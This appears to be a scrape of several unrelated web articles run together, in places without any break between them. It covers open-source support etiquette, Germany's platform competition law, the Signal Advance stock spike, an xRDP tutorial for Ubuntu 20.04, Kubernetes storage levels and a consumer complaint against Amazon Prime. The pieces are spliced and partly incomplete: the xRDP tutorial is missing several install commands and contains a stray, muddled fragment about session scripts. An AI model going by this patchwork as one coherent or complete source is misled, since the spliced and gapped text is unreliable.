<p>This was super fun to put together. It took me some hours to get everything set up nicely. But I learned a lot in the process. The setup far from perfect, but works pretty well for my use case. And that's enough. </p>
<p>The whole thing costs about 4 EUR/month which is pretty afordable. I could also just purchase a VPS for 2 EUR/month and call it a day. But would't learn much in the process. </p>
<p>I also created a <a href="https://github.com/duarteocarmo/hacking-on-my-finances">sanitized version of the repo</a> with all the files if you would like to hack around a bit. </p>
<p>Hope you found this walkthrough/showcase useful. My email's right in the bottom there if you have questions, don't be a stranger.</p>

<p>Providing support for an open-source project can be draining on the developers, and not receiving help can be frustrating for the users. If you need help with one of these projects, there are a few things you can keep in mind so you can find a solution sooner, and help out the developers at the same time. I develop a <a href="http://github.com/EngineHub/">few sizeable open-source software projects</a> that get around 100 support requests per day. I've based these recommendations on what I've seen, and the pitfalls that people often hit.</p>
<h3 id="read-documentation"><a href="#read-documentation" aria-label="read documentation permalink"></a>Read Documentation</h3>
<p>Before even considering to ask a question, you should check if documentation already covers it. If you're still unsure after having read it, then it's fair to ask the question. The documentation covers many questions I see about my projects. Many people have their questions answered by being linked to the documentation, without any further explanation or query.</p>
<h3 id="ask-your-question"><a href="#ask-your-question" aria-label="ask your question permalink"></a>Ask your Question</h3>
<p>This point sounds rather obvious, but most people do not start with their question in my experience. It's common to see people ask if they can ask questions, rather than just asking their question. Not only does this waste time, but it also majorly reduces your chance of getting a response. If someone sees a question they know the answer to, they can respond to it. Suppose someone sees a vague statement such as "Can I ask a question?" In that case, people can see a response as committing to answering the question once given. Unless someone knows absolutely everything about that software, they're unlikely to commit to something like that.</p>
<p>Rather than asking whether you can ask a question, you should ask your question.</p>
<h3 id="be-precise"><a href="#be-precise" aria-label="be precise permalink"></a>Be Precise</h3>
<p>When you're asking a question, make sure that you explain what is going wrong. Telling someone that a piece of software "doesn't work" does not provide enough information to attempt to help. You should explain what you did, what you were trying to achieve, and what result you got instead. Telling someone you got an error when you tried to run a command to achieve a result is significantly more helpful than saying that the command doesn't work. Make sure you provide all the relevant information. </p>
<p>Contrary to what you might assume, the problem you're having is not the most important thing to mention when asking for support. People often don't ask about their actual problem; generally, people ask why their attempted solution didn't work. Without knowing what the original problem was, it's impossible to provide the real answer. This concept is known as the "XY Problem". The best way to avoid asking an "XY Problem" is to explain what you're trying to achieve first. Not doing that can waste everyone's time and leave you without an answer.</p>
<h3 id="be-helpable"><a href="#be-helpable" aria-label="be helpable permalink"></a>Be Helpable</h3>
<p>When asking for help, it's crucial to put in the effort to being helped. If asked for clarifying information, give that information. If you refuse to provide the information, often developers can do nothing to provide help. It's also important to provide everything they ask. If asked for a log file, give the entire log file. Do not provide a small section that you deem to be relevant. It's often not the information that was needed.</p>
<p>If provided with solutions, make reasonable attempts actually to use them. Outright rejecting answers or expecting someone else to do it for you shows that you're not willing to help yourself. If you won't help yourself, you shouldn't expect anyone else to help you. It's important to also not argue with the developer about their response. They likely know more about their software than you and the common problems that people experience.</p>
<h3 id="be-patient"><a href="#be-patient" aria-label="be patient permalink"></a>Be Patient</h3>
<p>When asking questions to open source projects, be aware that you won't necessarily receive an immediate response. Most developers of these projects work on them in their spare time, alongside their job and life. Developers also need to sleep and could be in a different timezone to you. Expecting someone to be available to answer questions at all hours of the day is unrealistic. </p>
<p>Similarly, if a developer is helping someone else at the time, wait until they've finished. Constantly reminding them that they've not yet answered your question is annoying and doesn't achieve anything.</p>
<h3 id="be-respectful"><a href="#be-respectful" aria-label="be respectful permalink"></a>Be Respectful</h3>
<p>It's important to remember that the developers are people too, and have a lot more going on in their lives than answering people's questions all day. Treat them with respect, and they'll treat you with respect. They likely answer the questions of many people per day. Acting entitled or rude does not help you resolve your issue. Developers of open-source projects do not owe you anything unless you're paying them. Even if you are paying them, they only owe you what is under the payment terms.</p>
<p>If you're having a frustrating issue, make sure you don't take anger out on the developers. Harassing them will only lead to wasted time and disappointment for everyone involved.</p>
<h3 id="consider-supporting-them"><a href="#consider-supporting-them" aria-label="consider supporting them permalink"></a>Consider Supporting Them</h3>
<p>If you make heavy use of a project, especially in a commercial context, look to see whether they accept financial contributions. If the project is available on GitHub, chances are it'll use GitHub Sponsors. Many open-source projects, especially those used by large numbers of people, are significantly under-funded. If you're gaining value from their work, it's great if you're able to give them something back for their time.</p>
<h3 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h3>
<p>Asking for support from open source projects can sometimes be frustrating. If you make sure to ask good questions and be respectful, you'll have the best chance of getting a solution.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
<p>The German parliament on Thursday approved a reform of national competition law that would make Germany the first country in the world with preventative rules tailored to counter the market power of large digital platforms.</p>



<p>In moving forward quickly with the new constraints on Big Tech, Germany is increasing its leverage in the EU's development of a similar bloc-wide reforms that could end up replacing the German framework — but Berlin's approach also opens the door to legal challenges by the internet platforms.</p>



<p>Competition authorities traditionally can act only after a company has abused a dominant market position, which has proven a slow and ineffective way of dealing with anticompetitive behavior by digital giants. The <a href="https://www.politico.eu/?p=1573418">new framework</a> will put the German authority — the Bundeskartellamt — at the forefront when bringing in a new type of competition case, prohibiting<strong> </strong>abusive behavior before it takes place within markets where firms are not yet dominant.</p>



<p>The Bundeskartellamt could start compiling as of March a list of companies considered "of paramount significance on competition across markets." These companies will need to obey a set of rules, including the prohibition against giving preferential treatment to their own services or hindering interoperability with other services. </p>



<p>Falko Mohrs, a lawmaker with the Social Democrat party — who is steering the German reform — told POLITICO, "We see digital markets need new regulations, more proactive and efficient, when it comes to the big players."</p>



<p>German competition chief Andreas Mundt has highlighted how the coronavirus crisis amplifies<strong> </strong>the winner-takes-all dynamic on digital markets, with so-called gatekeeper platforms exerting outsized influence. "We really need to re-establish conditions for competitive options for companies outside the ecosystems of these huge digital companies," he said in November concerning the planned reform. </p>



<p>The bill was approved in the plenary of the Bundestag on Thursday morning, after a compromise between the country's three governing parties was reached late last week. It should still be approved by the Bundesrat, the legislative body representing Germany's states, but that is a formal step.</p>



<p>The vote comes weeks after the European Commission <a href="https://www.politico.eu/article/europe-digital-markets-act-services-act-tech-competition-rules-margrethe-vestager-thierry-breton/">proposed</a> a similar framework in its Digital Markets Act (DMA). For Germany, which has together with France been a <a href="https://www.politico.eu/article/eu-big-four-france-germany-italy-poland-press-executive-vice-president-margrethe-vestager-to-clear-path-for-champions/">driving force</a> behind the DMA, having its own rules in place means Berlin could apply more pressure on Brussels to improve — or at least not weaken — the EU proposal.</p>



<p>Germany wants national competition authorities, including the Bundeskartellamt, to have a coordinating role in the enforcement of the Digital Markets Act, said a person familiar with the German negotiating position. This is not foreseen in the Commission's proposal.</p>



<p>Mohrs said he would "definitely prefer a European approach. We hope <a href="https://www.politico.eu/wp-content/uploads/2021/01/13/German-Competition-Law-Reform-Compromise-Draft.pdf">this law</a> and its application can help inform the EU in its legislative process."</p>



<p>Asked if the German regime will be abandoned once the European rules enter into force, Mohrs said: "We will see if the Digital Markets Act will cover the practices at the same level of effectiveness as the [updated German law]."</p>



<p>“I assume that, at least at the beginning, Germany and the EU will try to find some compromise about sharing responsibility for the enforcement of rules applicable to large internet platforms in Europe,” said Clifford Chance competition lawyer Michael Dietrich.</p>



<h3>Platform pushback</h3>



<p>In its efforts to draw up a fast and functional framework, Germany may have left the platforms and their advisers with at least two&nbsp;big&nbsp;avenues to challenge enforcement of the measure.&nbsp;The first is the proposed expedited appeals process.&nbsp;</p>



<p>To prevent internet platforms from stretching out legal procedures, lawmakers want appeals against decisions under the new regime to go straight to the Federal Supreme Court in Karlsruhe, skipping the usual first step of the Higher Regional Court in Düsseldorf.</p>



<p>According to two German competition lawyers, such a shortened appeal procedure could be considered unconstitutional. The Supreme Court normally only reviews questions of law, but would operate in this case as the only instance when facts would be reviewed. And rights of defense would also be curtailed in front of the competition authority, where the burden of proof is shifted to the platforms, meaning they need to demonstrate that they did not break the law.</p>



<p>Keeping the German regime in place after the DMA enters into force also could expose Bundeskartellamt decisions to claims by the platforms that only the EU has jurisdiction to regulate gatekeepers.</p>



<p>The DMA seeks to harmonize gatekeeper rules across the bloc, saying that "Member States shall not impose on gatekeepers further obligations by way of laws, regulations or administrative action for the purpose of ensuring contestable and fair&nbsp;markets."  </p>



<p>While the EU is said to have come to an understanding with Germany that its regime is considered an extension of competition law and therefore exempted from the harmonization rule, legal experts agree that the German rules are at least a gray zone between competition law and regulation. </p>



<p>"In my view, you could well consider [the German regime] as regulation rather than competition law," said Romina Polley, a competition lawyer at Cleary Gottlieb who advises Google on the reform. </p>



<p>Polley argued that the German regime enables the competition authority to prohibit conduct<strong> </strong>by an online platform before it takes place without a detailed assessment of the platform's power on a specific market or the effects of its conduct, as is usual in antitrust cases. </p>



<p>"GAFA companies might claim in later proceedings against a prohibition under [the new German rules] that its legal basis conflicts with the EC’s exclusive jurisdiction," Polley said, referring to the tech giants. </p>

<p>There’s been a lot of <a href="https://compoundadvisors.com/2020/the-craziest-thing-in-markets-you-may-ever-see" target="_blank" rel="noreferrer noopener">crazy things</a> going on in markets lately, but this one may top them all.</p>



<p>Last Thursday morning, Elon Musk sent out this tweet to his 41 million followers…</p>



<figure><img loading="lazy" width="558" height="98" src="https://compoundadvisors.com/wp-content/uploads/2021/01/image-18.png" alt="" srcset="https://compoundadvisors.com/wp-content/uploads/2021/01/image-18.png 558w, https://compoundadvisors.com/wp-content/uploads/2021/01/image-18-300x53.png 300w" sizes="(max-width: 558px) 100vw, 558px"></figure>



<p>What’s Signal?</p>



<p>It’s a messaging app for your phone and an alternative to WhatsApp, which has been criticized recently for <a href="https://www.pcmag.com/news/elon-musk-tells-followers-to-use-signal-messaging-app-amid-whatsapp-privacy" target="_blank" rel="noreferrer noopener">privacy concerns</a> (sharing data with Facebook, its parent company).</p>



<p>As one might have guessed, the demand for Signal exploded after Musk’s tweet.</p>



<p>And as a result, traders naturally looked to the financial markets to see if they could profit from it.</p>



<p>In searching for Signal, what they found was a company called “Signal Advance.”</p>



<p>Are they one in the same?</p>



<p>Not exactly.</p>



<p>Signal Advance is a small company that has absolutely nothing to do with the <a href="https://en.wikipedia.org/wiki/Signal_(software)" target="_blank" rel="noreferrer noopener">nonprofit company called Signal</a> or its messaging app. </p>



<p>Did that stop traders from buying Signal Advance ($SIGL)?</p>



<p>Not at all.</p>



<p>It closed last Thursday (1/7) at $3.76, an increase of 527% from the day before the Musk tweet.</p>



<p>Did traders soon realize their mistake and reverse course?</p>



<p>No. Last Friday (1/8), it closed at $7.19, up another 91%. </p>



<p>Surely that was the end of it, right?</p>



<p>Nope. Today the stock hit a high of $70.85, a 118x increase from last Wednesday’s close.</p>



<figure><a href="https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11.png" target="_blank" rel="noopener"><img loading="lazy" width="990" height="591" src="https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11.png" alt="" srcset="https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11.png 990w, https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11-300x179.png 300w, https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11-768x458.png 768w" sizes="(max-width: 990px) 100vw, 990px"></a></figure>



<p>Its market cap at today’s high hit $739 million, up from $6 million before the Musk tweet.</p>



<p>If that’s not a clear signal of insanity, I don’t know what is.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>In this tutorial we’ll install <strong>xRDP</strong> on a server running <strong>Ubuntu 20.04</strong> and install multiple desktop environments on it (Openbox, GNOME, XFCE, LXQt, LXDE, MATE, KDE Plasma). We’ll see how to connect via RDP from Windows, Linux, macOS, Android and iOS, how to optimize the connection speed in some cases, and how to fix a few common issues when using xRDP.</p>
<p>xRDP is a free and open-source implementation of Microsoft RDP (Remote Desktop Protocol) that enables other operating systems, other than Windows, to provide a fully functional remote desktop experience.</p>
<p>xRDP is fully compatible with <code>Microsoft RDP</code>, <code>rdesktop</code>, <code>FreeRDP</code> and <code>NeutrinoRDP</code>.</p>
<p>With xRDP you can have your own RDP Server on your Linux box, and connect to it via Microsoft’s Remote Desktop Client (if you use Windows), but also, you can use Linux, macOS, Android and iOS using their respective clients.</p>

<h2><span id="Prerequisites"></span><strong>Prerequisites</strong><span></span></h2>
<ul>
<li>A Linux box running Ubuntu 20.04.</li>
<li>A Desktop Environment.</li>
<li>A user with <code>sudo</code> privileges. We recommend a <strong>non-root</strong> <code>sudo</code> user, because acting as root can damage your system if you’re not careful. When you’re logged in as <code>root</code>, applications are running with <strong>root privileges</strong> and because of some bug or vulnerability they can damage your system. You can do anything and the system won’t ask, and you can easily change the system in a way that could be harmful, if you’re not careful. If you act as a <code>non-root</code> <code>sudo</code> user, then the system will ask for the password, which could make you pause and prevent you from making a potentially harmful change.</li>
</ul>
<hr>
<h2><span id="Step_1_%E2%80%93_Install_xRDP_on_Ubuntu_20_04"></span>Step 1 – Install xRDP on Ubuntu 20.04<span></span></h2>
<p>To begin,we’ll update the package index:</p>
<pre data-enlighter-language="generic">sudo apt update</pre>
<p>To install xRDP, run the command:</p>
<pre data-enlighter-language="generic">sudo apt -y install xrdp</pre>
<p>The output will look something like this:</p>
<pre data-enlighter-language="generic">Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libunity-gtk2-parser0 libunity-gtk3-parser0 unity-gtk-module-common
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  xorgxrdp
Suggested packages:
  guacamole xrdp-pulseaudio-installer
The following NEW packages will be installed:
  xorgxrdp xrdp
0 upgraded, 2 newly installed, 0 to remove and 147 not upgraded.
Need to get 488 kB of archives.
After this operation, 3212 kB of additional disk space will be used.</pre>
<p>Once installed, it should run as a service automatically. You can check it by typing:</p>
<pre data-enlighter-language="generic">sudo systemctl status xrdp</pre>
<p>You should see something like:</p>
<pre data-enlighter-language="generic">● xrdp.service - xrdp daemon
     Loaded: loaded (/lib/systemd/system/xrdp.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2020-12-23 15:10:48 CET; 3min 24s ago
       Docs: man:xrdp(8)
             man:xrdp.ini(5)
   Main PID: 1937 (xrdp)
      Tasks: 1 (limit: 1068)
     Memory: 1.4M
     CGroup: /system.slice/xrdp.service
             └─1937 /usr/sbin/xrdp</pre>
<p>xRDP makes use of the file <code>/etc/ssl/private/ssl-cert-snakeoil.key</code> which belongs to the <code>ssl-cert</code> group. Therefore, we need to add the xRDP user to that group:</p>
<pre data-enlighter-language="generic">sudo adduser xrdp ssl-cert</pre>
<p>We need to restart xRDP to changes to take effect:</p>
<pre data-enlighter-language="generic">sudo systemctl restart xrdp</pre>
<p>At this point, you have xRDP installed and running on your Ubuntu.</p>
<h3><span id="Opening_Ports"></span>Opening Ports<span></span></h3>
<p>Assuming you have Uncomplicated Firewall (<strong>ufw</strong>) installed and active, to be able to connect to our server, we need to open the 3389 (defaulft) port on our Firewall.</p>
<p>To accomplish this, we need to run:</p>
<pre data-enlighter-language="generic">sudo ufw allow 3389</pre>
<p>You can secure it even more, by allowing only a specific IP address or IP range:</p>
<p>For a specific IP address:</p>
<pre data-enlighter-language="generic">sudo ufw allow from 1.1.1.1 to any port 3389</pre>
<p>For a specific IP range:</p>
<pre data-enlighter-language="generic">sudo ufw allow from 192.168.0.0/24 to any port 3389</pre>
<h3><span id="xRDP_Configuration"></span>xRDP Configuration<span></span></h3>
<p>By default, you don’t need to make any changes. But you can change the default port, add compression, and other settings by typing:</p>
<pre data-enlighter-language="generic">sudo nano /etc/xrdp/xrdp.ini</pre>
<p>Remember to restart the service, after any change.</p>
<h2><span id="Step_2_%E2%80%93_Install_Your_Preferred_Desktop_Environment"></span>Step 2 – Install Your Preferred Desktop Environment<span></span></h2>
<p>To be able to connect to your box with xRDP, you’ll need at least one desktop environment installed on it.</p>
<h3><span id="Install_GNOME_Desktop_Environment"></span>Install GNOME Desktop Environment<span></span></h3>
<p><strong>GNOME</strong> is the default desktop environment for many Linux distros. At the time of writing, the latest version is GNOME 3.</p>
<p>To install it, run the following command:</p>
<pre data-enlighter-language="generic">sudo apt -y install ubuntu-desktop</pre>
<p>This is how GNOME Desktop looks like when you log in:<br>

<h3><span id="Install_XFCE_Desktop_Environment"></span>Install XFCE Desktop Environment<span></span></h3>
<p><strong>XFCE</strong> is another Desktop Environment but low on system resources and fast. In other words: a lightweight desktop. You can install it by typing:</p>
<pre data-enlighter-language="generic">sudo apt -y install xubuntu-desktop xubuntu-core</pre>
<p>This is how XFCE looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png" alt="xRDP XFCE4 Desktop" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1536x864.png 1536w"></p>
<h3><span id="Install_LXQt_Desktop_Environment"></span>Install LXQt Desktop Environment<span></span></h3>
<p><strong>LXQt</strong> is a port of LXDE. As LXDE, it has low resource requirements, in comparison to most popular desktop environments. It’s one of the better choices to use with xRDP, in my opinion.</p>
<p>To install it run:</p>
<pre data-enlighter-language="generic">sudo apt -y install lxqt</pre>
<p>This is how LXQt looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png" alt="xRDP LXQT" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1536x864.png 1536w"></p>
<h3><span id="Install_LXDE_Desktop_Environment"></span>Install LXDE Desktop Environment<span></span></h3>
<p><strong>LXDE</strong> (Lightweight X11 Desktop Environment) is a popular lightweight desktop environment. It’s built to have low resource requirements, and is another great choice for xRDP.</p>
<p>There are multiple ways you can install it. For the purposes of this tutorial I’m using a simple command. If you’d like different methods, based on certain preferences you may have, you can check the <a href="https://wiki.lxde.org/en/Installation" target="_blank" rel="noopener">Intallation section on LXDE.org</a></p>
<p>To quickly install LXDE run:</p>
<pre data-enlighter-language="generic">sudo apt -y install lxde</pre>
<p>This is how LXDE looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png" alt="xRDP LXDE" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1536x864.png 1536w"></p>
<h3><span id="Install_MATE_Desktop_Environment"></span>Install MATE Desktop Environment<span></span></h3>
<p><strong>MATE</strong> is an attractive and intuitive Desktop Environment. A fork from the GNOME 2 Desktop, in response to the negative reception of GNOME 3, when the traditional taskbar (<a href="https://en.wikipedia.org/wiki/GNOME_Panel" target="_blank" rel="noopener">GNOME Panel</a>) with the <a href="https://en.wikipedia.org/wiki/GNOME_Shell" target="_blank" rel="noopener">GNOME Shell</a>.</p>

<h3><span id="Install_KDE_Plasma_Desktop_Environment"></span>Install KDE Plasma Desktop Environment<span></span></h3>
<p><strong>KDE Plasma</strong> is one of the most recognized Desktops Environments. It’s one of the most beautiful desktop environments, in my opinion, and it’s got some great features, and it’s very customizable.</p>
<p>You can install it by running:</p>

<h3><span id="Install_Openbox_Window_Manager"></span>Install Openbox Window Manager<span></span></h3>
<p><strong>Openbox</strong> is a window manager and not a desktop environment. It won’t offer you a wallpaper, taskbar or system panel. But it’s very lightweight and you can open the menu by right clicking anywhere on the screen and selecting what you want to run.</p>
<p>It’s probably the best choice if you find that your connection is laggy with xRDP, but you absolutely need to connect to a Linux machine using xRDP.</p>
<p>Here’s how Openbox looks like:<br>

<p>If you have multiple desktop environments installed and want to switch between them you can run the following command:</p>
<pre data-enlighter-language="generic">sudo update-alternatives --config x-session-manager</pre>
<p>You’ll be presented with the options representing your installed desktop environments. Just enter the number corresponding with your desktop environment from the list and press Enter.</p>

The same for <strong>startxfce4</strong> and <strong>xfce4-session</strong> – selecting either will switch to XFCE. As far as I know, <strong>startlxde</strong> and <strong>startxfce4</strong> are scripts that call the executables lxsession and startlxde, respectively.

<h2>Introduction</h2>



<p>Don’t you love memes? Now there’s one explaining the 5 levels of storage available to Kubernetes. <em>To the right &gt;&gt;&gt;</em></p>



<p>Let’s go through a high-level overview of each level. You can then focus on the level that best matches your cluster’s needs.</p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 1 –</span><span data-amp-original-style="color: #ffffff;background-color: #ffffff">              </span><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Ephemeral Storage</span></h2>



<p><strong>What is it?</strong> Default storage state of every Kubernetes cluster. Each node contains “ephemeral” storage space. </p>



<p><strong>Useful for:</strong> this is for storage of <em>temporary</em> user data within the VM. Works fine if your application doesn’t need to recall data. </p>



<p><strong>Leaves off at:</strong> now, how many apps get by with temporary storage alone?</p>
</div>

<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 2 – hostPath</span></h2>



<p><strong>What is it? </strong> The first step to running a persistent (rather than temporary) volume of any kind. hostPath uses a directory to emulate network-attached storage (NAS) within the node.</p>



<p><strong>Useful for:</strong> development and testing on a single-node cluster. </p>



<p><strong>Leaves off at: </strong>you wouldn’t use this on a production cluster because of its limited reach.</p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 3 – Static Persistent Volume </span></h2>



<p><strong>What is it? </strong> Proper storage for your applications at production. Static PVs are virtual views of physical storage. Users can then request PVs using Persistent Volume Claims (PVCs).</p>



<p><strong>Useful for: </strong>when developers/operators are making simple, predictable claims for storage.</p>



<p><strong>Leaves off at: </strong>requires user’s PVC to match what’s available. Chance of mismatch is higher as needs become more complex. Nodes risk losing out on available storage.  </p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 4 – Dynamic Persistent Volume</span></h2>



<p><strong>What is it? </strong> A more robust form of Persistent Volume than the static version. Essentially automates the process of PV creation.</p>



<p><strong>Useful for: </strong>situations where PVs are created based on demand rather than the other way round. Kicks in when static PVs are unable to provide storage for a specific PVC.</p>



<p><strong>Leaves off at: </strong>it’s actually good enough for most applications. Well at least the ones that don’t get pummelled with 10s of thousands of users a day.</p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 5 – Topology-aware Volume Provisioner</span></h2>



<p><strong>What is it?</strong> Dynamic PVs are provisioned using scheduler input on the best positioning for the pod. Cuts risk of pod failure due to PV running in low CPU or memory VMs.</p>



<p>Best explained by this illustration where multiple zones are created with duplicate nodes :</p>

<p><strong>Useful for: </strong>higher availability of applications especially in mission-critical situations. Increases fault tolerance by running workloads across several zones within a region.</p>



<p><strong>Leaves off at: </strong>nothing. This is the ultimate level of Kubernetes storage. Master it and you’ve got a cluster that can handle almost any storage challenge. </p>

							<p>Amazon puts obstacles in the way of consumers who wish to unsubscribe from its Amazon Prime service. Today the Norwegian Consumer Council filed a legal complaint against the company for breaches of the Unfair Commercial Practices Directive.</p><p>In the process of unsubscribing from Amazon Prime, the company manipulates consumers to continue using the service in what seems like a deliberate attempt to confuse and frustrate customers.</p>
<p>The Norwegian Consumer Council`s <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/complaint-against-amazon-prime.pdf">legal complaint</a>&nbsp;to the Consumer Protection Authority highlights what we believe to be Amazon´s unfair commercial practices and breaches of marketing law.</p>
<p>– It should be as easy to end a subscription as it was to subscribe in the first place. Amazon should facilitate a good user experience instead of hindering customers and tricking them into continuing paid services they do not need or want, said Director of Digital Policy at the Norwegian Consumer Council, Finn Lützow-Holm Myrstad.</p>
<p>– In our view, this practice not only betrays the expectations and trust of consumers but breaches European law.</p>
<h2><strong>One out of four consumers struggle to unsubscribe </strong></h2>
<p>The Norwegian Consumer Council <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/population-survey-digital-content.pdf">surveyed 1,000 Norwegian consumers</a> and analysed their experience. One out of four Norwegian consumers reported difficulties unsubscribing from digital content services. Twenty-five percent of consumers surveyed reported that they pay for one or more subscriptions that they use with such infrequency that they might as well end the subscription.</p>
<p>– Most of us use digital content services to watch movies, listen to music or audiobooks, play video games, or read the news. At the same time, many consumers experience issues with subscriptions being very easy to sign up for, but difficult to get out of, said Finn Myrstad.</p>
<p>– Companies such as Amazon seem to speculate that they can discourage customers from cancelling their subscriptions either by heavily emphasizing the benefits that will be lost upon cancellation or by making the process so complicated that its users simply give up.</p>
<h2><strong>Amazon manipulates users into staying by using dark patterns</strong></h2>
<p><iframe src="https://www.youtube-nocookie.com/embed/GpEQ4OWNO4Y" width="650" height="433" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<p><a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">The Norwegian Consumer Council’s study</a> analysed the cancellation process for Amazon Prime. The analysis shows that consumers who want to leave the service are faced with a large number of hurdles, including complicated navigation menus, skewed wording, confusing choices, and repeated nudging. Throughout the process, Amazon manipulates users through wording and graphic design, making the process needlessly difficult and frustrating to understand.</p>
<p>– Unfortunately, using <em>dark patterns</em>, or manipulative design, is a common practice online. Consumers are constantly bombarded by a variety of subtle and less subtle attempts to push us into making choices that favour the companies at the cost of our own time, attention, and money, said Myrstad.</p>
<h2><strong>A global problem requires global solutions</strong></h2>
<p>16 different consumer organizations in Europe and the United States are now taking action against Amazon based on the report by the Norwegian Consumer Council. They will each ask their respective consumer authorities to investigate the use of dark patterns in their countries.</p>
<p>This international campaign builds upon the Norwegian Consumer Council’s joint 2018 campaign with seven other European consumer organizations against Google’s use of dark patterns. The complaint, which the Irish Data Protection Commissioner’s office is still investigating, uncovered how Google manipulates users into turning on comprehensive location tracking.</p>
<p>– The Consumer Protection Authority can set an important precedent by issuing a decision against Amazon. A decision in favour of the complaint would mark that the use of dark patterns is not in accordance with European law and would elevate the rights of consumers.</p>

January 15, 2021 | https://pijul.org/posts/2021-01-15-sanakirja-locks/ | <a href="https://web.archive.org/web/*/https://pijul.org/posts/2021-01-15-sanakirja-locks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Friday, January 15, 2021</p><p>I just finished implementing a non-trivial bit of Pijul: cross-process locks for Sanakirja databases.
